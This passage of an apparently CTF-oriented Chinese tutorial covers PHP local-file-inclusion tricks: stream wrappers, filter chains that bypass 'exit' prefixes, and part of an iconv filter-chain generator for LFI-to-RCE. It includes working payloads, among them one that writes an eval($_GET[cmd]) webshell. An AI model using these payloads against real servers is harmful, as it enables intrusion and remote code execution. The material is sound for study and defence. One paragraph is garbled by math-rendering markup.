<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><strong>示例</strong>：</p>
<ol>
<li>
<p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
<pre><code class="highlight livecodeserver"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">include</span>.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phpinfo.php</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBf" alt="图片描述"></p>
</li>
<li>
<p><code>php://input + [POST DATA]</code>执行php代码</p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p>
<p>若有写入权限，写入一句话木马</p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p>
</li>
</ol>
</li>
<li>
<p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=AHKgds%2BGe0QaKChQ1m1oog%3D%3D.na4Zlt5y4duEWHHydmOSTh2NkSbiDQNUtTreUgqxsETwe3g04SdnSBMCMdEdQ27X">https://php.net/manual/zh/wrappers.php.php</a></p>
</li>
</ul>
<h3 id="zip-bzip2-zlib-协议"><a class="markdownIt-Anchor" href="#zip-bzip2-zlib-协议"></a> <code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h3>
<ul>
<li>
<p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :off/on</li>
</ul>
</li>
<li>
<p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<ol>
<li>
<p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBj" alt="图片描述"></p>
</li>
<li>
<p><code>compress.bzip2://file.bz2</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBt" alt="图片描述"></p>
</li>
<li>
<p><code>compress.zlib://file.gz</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBu" alt="图片描述"></p>
</li>
</ol>
</li>
<li>
<p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=w0uak4RdRJUStEHdEK6h4w%3D%3D.xhWZ9YsBZncXK%2FYcM6ZNJ5Jey44TQSRRDG2PDhW%2BVOCrc%2FwcHb6xJoP7Fff88EcMBe0t2zuSqAZeW77CzMA4ZQ%3D%3D">http://php.net/manual/zh/wrappers.compression.php</a></p>
</li>
</ul>
<h3 id="data-协议"><a class="markdownIt-Anchor" href="#data-协议"></a> <code>data://</code> 协议</h3>
<ul>
<li>
<p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li>
<p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
</li>
<li>
<p><strong>用法</strong>：</p>
<pre><code class="highlight dts"><span class="symbol">data:</span><span class="comment">//text/plain,</span>
<span class="symbol">data:</span><span class="comment">//text/plain;base64,</span></code></pre>
</li>
<li>
<p><strong>示例</strong>：</p>
<ol>
<li>
<p><code>data://text/plain,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBB" alt="图片描述"></p>
</li>
<li>
<p><code>data://text/plain;base64,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBD" alt="图片描述"></p>
</li>
</ol>
</li>
</ul>
<h3 id="http-https-协议"><a class="markdownIt-Anchor" href="#http-https-协议"></a> <code>http:// &amp; https://</code> 协议</h3>
<ul>
<li>
<p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li>
<p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
</li>
<li>
<p><strong>用法</strong>：</p>
<pre><code class="highlight dts"><span class="symbol">http:</span><span class="comment">//example.com</span>
<span class="symbol">http:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">http:</span><span class="comment">//user:password@example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">https:</span><span class="comment">//user:password@example.com</span></code></pre>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBP" alt="图片描述"></p>
</li>
</ul>
<h3 id="phar-协议"><a class="markdownIt-Anchor" href="#phar-协议"></a> <code>phar://</code> 协议</h3>
<p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBX" alt="图片描述"></p>
<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p>
<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
<h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> WAF</h2>
<h3 id="filter链绕过"><a class="markdownIt-Anchor" href="#filter链绕过"></a> filter链绕过</h3>
<p>构造一串字符利用过滤器的性质构造(在已知文件前构造命令执行)或破坏字符(exit)</p>
<h4 id="base64特质"><a class="markdownIt-Anchor" href="#base64特质"></a> base64特质</h4>
<p>在base64_decode中会将不在A-Za-z0-9+/=的字符全都去掉，于是可以通过这个来绕过exit</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161257630.png" alt="image-20250326161257630"></p>
<p>乍一眼，你这不对啊。。。。这是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化，解码的时候有效字符一定要是4的倍数，不然就会解码错误，原因就是未补足的字符本质上是用=补足的</p>
<p>而在解码时=后还有字符明显是错误的，所以就会注入失败</p>
<h4 id="rot13-编码绕过"><a class="markdownIt-Anchor" href="#rot13-编码绕过"></a> <strong>rot13 编码绕过</strong></h4>
<p>原理和base64一样，可以直接转码分解死亡代码；这里不再多说；直接看如下实验结果即可；</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161910851.png" alt="image-20250326161910851"></p>
<p>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签(short_open_tag)，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；</p>
<h4 id="htaccess的预包含利用"><a class="markdownIt-Anchor" href="#htaccess的预包含利用"></a> <strong><code>.htaccess</code>的预包含利用</strong></h4>
<p>利用 <code>.htaccess</code>的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p>
<pre><code class="highlight plaintext">$filename=php://filter/write=string.strip_tags/resource=.htaccess

$content=?&gt;php_value%20auto_prepend_file%20G:\s1mple.php</code></pre>
<p>同时传入如上的代码，首先来解释<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mtext>的代码，这里引用了</mtext><mi mathvariant="normal">‘</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mi mathvariant="normal">.</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><msub><mi>p</mi><mi>t</mi></msub><mi>a</mi><mi>g</mi><mi>s</mi><mi mathvariant="normal">‘</mi><mtext>过滤器，可以过滤</mtext><mi mathvariant="normal">.</mi><mi>h</mi><mi>t</mi><mi>a</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mtext>内容的</mtext><mi>h</mi><mi>t</mi><mi>m</mi><mi>l</mi><mtext>标签，自然也就消除了死亡代码；</mtext></mrow><annotation encoding="application/x-tex">filename的代码，这里引用了`string.strip_tags`过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">引</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">了</span><span class="mord">‘</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">.</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">s</span><span class="mord">‘</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mord cjk_fallback">器</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mord">.</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">容</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">签</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">自</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">消</span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">死</span><span class="mord cjk_fallback">亡</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">；</span></span></span></span>content即闭合死亡代码使其完全消除，并且写入自定义包含文件；实验结果如下所示：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162057074.png" alt="image-20250326162057074"></p>
<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜 <code>flag.php flag /flag /flag.php</code> 等等；另外还有个很大的问题是，<code>string.strip_tags</code>过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；</p>
<h4 id="蓄意乱序"><a class="markdownIt-Anchor" href="#蓄意乱序"></a> 蓄意乱序</h4>
<p>介绍UCS-2LE和UCS-2BE两种过滤器的组合以及UCS-4LE和UCS-2BE两种过滤器的组合</p>
<p>其中2xE都是进行两位一反转，4xE进行四位一反转，目的其实就是破坏前面死亡exit的顺序来达到让php无法识别的效果</p>
<h4 id="过滤器编码组合拳"><a class="markdownIt-Anchor" href="#过滤器编码组合拳"></a> <strong>过滤器编码组合拳</strong></h4>
<p>过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码；</p>
<p><strong>先来一种：</strong></p>
<pre><code class="highlight plaintext">$filename=&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;
$content=&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</code></pre>
<p>可以看到，利用string.strip_tags可以过滤掉html标签，将<strong>标签内的所有内容进行删去</strong>，然后再进行base64解码，成功写入shell；</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162042101.png" alt="image-20250326162042101"></p>
<p>但是这种方法有一定的局限性也还是因为string.strip_tags在php7.3.0以上的环境下会发生段错误，从而导致无法写入，但是在php5的环境下则不受此影响；</p>
<p><strong>再来另外一种</strong></p>
<p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p>
<pre><code class="highlight plaintext">$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php
$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=s1mple.php</code></pre>
<p>如此便可以写入；其原理也很简单，就是利用过滤器嵌套让死亡代码在各种变换之间进行分解扰乱，然后再次写入木马；</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162048585.png" alt="image-20250326162048585"></p>
<p>这里非常巧合的是内容经过压缩转小写然后解压之后，我们的目的代码并没有发生变化，这也为写入木马奠定了基础；</p>
<h4 id="无中生有之inconv"><a class="markdownIt-Anchor" href="#无中生有之inconv"></a> 无中生有之inconv</h4>
<p>呃呃，又长又臭的脚本环节，只讲一下原理吧，脚本还是要等我的XSS三兄弟学完才会回头补完一下。。</p>
<p>主包讲的不好也可以参考p神的博客<a href="https://err0r233.github.io/posts/28510.html">真正的from LFI to RCE——CVE-2024-2961 | Err0r233</a></p>
<p>从上面已经知道我们可以利用base64解码的特质和strip_tags来删除掉一些过滤</p>
<p>那有的人会说了，主包主包你的混淆确实很强，但是如何他的注入点干净的不得了呢</p>
<pre><code class="highlight php"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
<span class="keyword">include</span>(<span class="variable">$a</span>);</code></pre>
<p>这个时候就需要自行构造一些危险代码，同时利用base64将其先编码防止诸如<code>&lt;?;&gt;</code>这些字符在解码时被过滤掉</p>
<p>所以要介绍一些神奇的过滤器:</p>
<ul>
<li>CSISO2022KR</li>
</ul>
<p>将字符集从我们常用的<code>UTF-8</code>转换为<code>CSISO2022KR</code></p>
<pre><code class="highlight php">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,aaaaaaaaaaaaaa</span>
转换结果：
<span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;%1B%24%29Caaaaaaaaaaaaaa&quot;</span>

其实是 <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;不可见字符$)Caaaaaaaaaaaaaa&quot;</span></code></pre>
<p>此时可以看到成功构造了一个字符C</p>
<p>达到了无中生有的效果了</p>
<p>而通过几次巧妙的构造，就可以出整张base64表，这里直接贴p神搓好的脚本</p>
<pre><code class="highlight python"><span class="comment">#!/usr/bin/env python3</span>
<span class="keyword">import</span> argparse
<span class="keyword">import</span> base64
<span class="keyword">import</span> re

<span class="comment"># - Useful infos -</span>
<span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span>
<span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span>
<span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span>

<span class="comment"># No need to guess a valid filename anymore</span>
file_to_use = <span class="string">&quot;php://temp&quot;</span>

conversions = &#123;
    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,
    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,
    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,
    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,
    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,
    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,
    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,
    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,
    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,
    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,
    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,
    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,
    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,
    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,
    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,
    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,
    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,
    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,
    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,
    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,
    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,
    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,
    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,
    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,
    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,
    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,
    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,
    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,
    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,
    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,
    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,
    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,
    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,
    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,
    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,
    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,
    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,
    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,
    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,
    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,
    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,
    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,
    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,
    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,
    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,
